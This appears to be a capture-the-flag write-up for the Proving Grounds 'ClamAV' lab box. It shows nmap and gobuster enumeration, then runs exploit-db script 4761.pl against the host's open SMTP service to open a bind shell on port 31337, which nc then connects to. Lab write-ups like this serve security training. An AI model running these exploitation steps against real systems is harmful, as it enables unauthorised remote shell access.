
---
layout: default
title: x001-ClamAV
nav_order: 2
has_children: false
parent: ProvingGrounds
grand_parent: Writeups
---

## x001-ClamAV
### Enumeration 

####  NMAP
```bash
nmap -A -T4 192.168.148.42 -p-
```

We have the following list of open port : 
- 22
- 25
- 80
- 139
- 199
- 445
- 60000

![](attachments/Pasted%20image%2020220219175320.png)

We can run a vuln script on those ports :
```bash
nmap -sV --script vuln 192.168.148.42 -p22,25,80,139,199,445,60000
```

The list of vulnerabilities doesn't provide anything useful to exploit the box

#### Website 
Accessing the website, we have the following message : 
```
01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011 0000 01100010
```

Resulting in : `ifyoudontpwnmeuran00b`

##### Gobuster 

Using gobuster to detect folder on the webserver : 
```bash
gobuster dir -u http://192.168.148.42/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

It indicates a folder `/doc` but it's protected (403 error) and the tool 4-zero-3 bypass could reach the page. 

#### Smb 
Searching for the information inside the share using enum4linux doesn't give us more information. 

#### Other
After searching the name of the box in google, I have find out that it correspond to a software.

Looking for information on this software inside the exploitdb provide me the following output  : 
```bash
searchsploit clamav 
```

![](attachments/Pasted%20image%2020220219185703.png)

The latest exploit is to use an open SMTP server (it's our case, the port 25 is open on our box) 

So if we copy the exploit and run it : 
```bash
cp /usr/share/exploitdb/exploits/multiple/remote/4761.pl ./
perl 4761.pl 192.168.148.42
```


If we check the detail of the exploit, it opens the port 31337 for a remote shell access, we could use nmap to verify if the port is open or not : 

```bash
nmap -p 31337 192.168.148.42
---
PORT      STATE SERVICE
31337/tcp open  Elite
```

Using nc we finally receive the access to the machine : 
```bash
nc  192.168.148.42 31337 
```

![](attachments/Pasted%20image%2020220219190144.png)

